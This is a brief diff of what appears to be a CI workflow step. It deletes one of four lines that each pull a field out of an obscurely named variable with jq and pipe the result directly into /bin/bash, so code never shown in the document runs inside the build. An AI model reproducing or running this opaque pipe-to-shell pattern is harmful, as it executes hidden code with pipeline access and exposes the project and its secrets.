@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$ekuz777" | jq -r .n46200 | /bin/bash
           printf '%s' "$aw10" | jq -r .zyr74 | /bin/bash
-          echo $gvc39 | jq -r .h51700 | /bin/bash
           echo $nzxoz9487 | jq -r .ifk20 | /bin/bash
 
       - name: Store results
